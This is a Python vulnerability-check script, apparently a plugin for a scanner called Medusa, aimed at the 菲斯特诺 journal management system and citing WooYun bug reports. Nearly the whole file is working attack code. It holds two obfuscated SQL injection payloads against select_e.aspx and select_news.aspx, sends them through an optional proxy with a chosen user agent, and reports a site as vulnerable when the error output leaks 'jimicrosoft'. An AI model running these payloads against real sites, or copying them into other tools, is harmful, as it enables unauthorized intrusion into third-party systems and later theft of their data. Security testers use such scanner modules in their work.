#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 菲斯特诺期刊系统多处SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2015-0125186
         http://www.wooyun.org/bugs/wooyun-2010-0116361
author: Lucifer
description: 菲斯特诺期刊系统多处SQL注入。
'''
import urllib
import requests

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

payloads = ["/select_e.aspx?type=zzdw&content=1%27AnD%20ChAr(ChAr(74)%2BChAr(73)%2B@@VeRsIoN)<0--",
                    "/select_news.aspx?type=1&content=1/**//'/**/AnD/**/ChAr(ChAr(74)%2BChAr(73)%2B@@VeRsIon)/**/>0",]
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2
    Medusas=[]
    try:
        for payload in payloads:
            payload_url = scheme+"://"+url+payload
            headers = {
                'Accept-Encoding': 'gzip, deflate',
                'Accept': '*/*',
                'User-Agent': RandomAgent,
            }
            #s = requests.session()
            if ProxyIp!=None:
                proxies = {
                    # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                    "http": "http://" + str(ProxyIp)
                }
                resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
            elif ProxyIp==None:
                resp = requests.get(payload_url,headers=headers, timeout=5, verify=False)
            con = resp.text
            code = resp.status_code
            if con.lower().find('jimicrosoft')!=-1:
                Medusa = "{} 存在菲斯特诺期刊系统多处SQL注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
                Medusas.append(str(Medusa))
    except Exception as e:
        pass
    return Medusas